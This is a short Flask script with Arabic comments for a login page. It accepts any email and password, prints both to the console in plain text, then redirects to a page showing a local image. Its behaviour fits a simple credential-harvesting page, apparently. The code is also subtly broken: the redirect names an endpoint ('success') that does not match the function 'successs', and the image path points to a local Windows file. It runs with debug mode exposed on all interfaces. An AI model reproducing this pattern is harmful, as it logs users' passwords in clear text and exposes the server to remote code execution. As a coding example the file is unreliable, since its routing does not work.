from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# الصورة التي سيتم عرضها بعد تسجيل الدخول
IMAGE_PATH = r"C:\Users\ELNOUR CENTER\OneDrive\Immagini\FB_IMG_1504118825900.jpg"  # حدد مسار الصورة هنا

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]

        # طباعة البيانات للتأكد
        print(f"User Email: {email}")
        print(f"User Password: {password}")

        # تحويل المستخدم إلى صفحة الصورة مع تمرير مسار الصورة
        return redirect(url_for("success"))

    return render_template("login.html")


@app.route("/success")
def successs():
    return render_template("success.html", image_path=IMAGE_PATH)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
